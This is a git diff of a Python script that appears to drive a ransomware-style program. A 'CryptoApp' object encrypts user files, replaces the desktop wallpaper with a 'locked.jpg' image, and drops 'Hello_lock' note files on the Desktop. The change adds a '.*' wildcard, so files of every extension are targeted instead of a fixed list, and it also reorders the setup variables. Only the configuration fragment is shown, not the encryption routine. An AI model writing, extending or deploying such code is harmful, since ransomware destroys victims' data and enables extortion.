@@ -17,28 +17,29 @@ except IndexError:
 
 
 # Variables that must be initialized before CryptoApp constructor
-JSON_PATH: str = 'info.json'
+JSON_PATH:         str = 'info.json'
+extra_files_name:  str = 'Hello_lock'
+desktop_path:      str = os.path.join(os.path.expanduser('~'), "Desktop")
+lock_wallpaper:    str = os.path.abspath('locked.jpg')
+initScript:        Optional[str] = os.path.abspath(os.path.join('run', 'linuxtest.py'))
+new_wallpaper:     Optional[str] = None
 
 # Init the APP
 APP: CryptoApp = CryptoApp(START_PATH)
 
 # Set the initial options
-APP.setFilesToSkip([JSON_PATH, 'locked.jpg', 'utils.py', 'run', '.git'])
+APP.setFilesToSkip([JSON_PATH, 'locked.jpg', 'utils.py', 'run', '.git', f'{extra_files_name}*.txt'])
 APP.setExtensionsToModify([
     '.txt', '.docx', '.odt',
     '.jpg', '.png', '.jpeg', '.gif',
     '.mp3', '.mp4', '.avi', 
     '.json', '.conf',
-    '.py', '.js', '.html'
+    '.py', '.js', '.html',
+    '.*'
 ])
 
 # Init the variables
 target_os, target_de = APP.determineOS()
-extra_files_name:      str = 'Hello_lock'
-desktop_path:          str = os.path.join(os.path.expanduser('~'), "Desktop")
-lock_wallpaper:        str = os.path.abspath('locked.jpg')
-new_wallpaper:         Optional[str] = None
-initScript:            Optional[str] = os.path.join('run', 'linuxtest.py')
 
 
 if __name__ == '__main__':
@@ -75,7 +76,7 @@ if __name__ == '__main__':
         # Get the current wallpaper
         # And save it to JSON
         currentBG: Optional[str] = APP.getDesktopBG(target_os, target_de)
-
+        
         if currentBG:
             asJSON["original_background"] = currentBG
         
